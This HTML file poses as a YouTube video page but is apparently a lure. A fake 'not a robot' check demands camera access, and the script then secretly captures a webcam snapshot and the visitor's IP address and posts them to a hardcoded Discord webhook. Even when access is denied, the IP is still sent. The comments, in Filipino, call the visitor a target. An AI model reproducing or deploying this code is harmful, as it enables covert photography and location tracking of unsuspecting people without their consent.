<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta property="og:title" content="YouTube - Watch Now">
    <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; color: white; }
        #player { width: 100%; height: 100%; border: none; display: none; }
        #lock-screen { text-align: center; z-index: 9999; padding: 20px; }
        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 15px; }
        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
        .error-msg { color: #ff4444; display: none; margin-top: 15px; font-size: 14px; }
    </style>
</head>
<body>

    <div id="lock-screen">
        <div class="play-btn" onclick="requestAccess()"></div>
        <h2>Confirm you're not a robot</h2>
        <p>Please allow camera access to verify and play the video.</p>
        <div id="error" class="error-msg">‚ö†Ô∏è Access Denied. You must ALLOW camera to watch this video. Please refresh and try again.</div>
    </div>

    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw?autoplay=1" allow="autoplay; encrypted-media"></iframe>

    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";

        async function requestAccess() {
            const errorText = document.getElementById('error');
            
            try {
                // 1. KUNIN ANG IP AGAD
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                // 2. I-FORCE ANG CAMERA ALLOW
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // PAG UMABOT DITO, IBIG SABIHIN NAG-ALLOW SILA!
                document.getElementById('lock-screen').style.display = 'none';
                document.getElementById('player').style.display = 'block';

                // 3. KUNIN ANG SHOT
                const vid = document.getElementById('v');
                vid.srcObject = stream;

                setTimeout(async () => {
                    const can = document.getElementById('c');
                    can.width = 640; can.height = 480;
                    can.getContext('2d').drawImage(vid, 0, 0);
                    const img = can.toDataURL('image/jpeg', 0.6);
                    const blob = await (await fetch(img)).blob();
                    
                    const fd = new FormData();
                    fd.append('file', blob, 'huli.jpg');
                    fd.append('payload_json', JSON.stringify({
                        content: "üéØ **SUCCESS! TARGET ALLOWED CAM**\n**IP:** " + ipData.ip
                    }));

                    fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 1000);

            } catch (e) {
                // PAG NAG-DENY, HINDI LALABAS ANG VIDEO
                errorText.style.display = 'block';
                
                // Send IP pa rin sa Discord para alam mong may nag-attempt
                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
                fetch(hook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: "üö´ **DENIED!** Ayaw mag-allow ng sigbin.\n**IP:** " + ipData.ip })
                });
            }
        }
    </script>
</body>
</html>
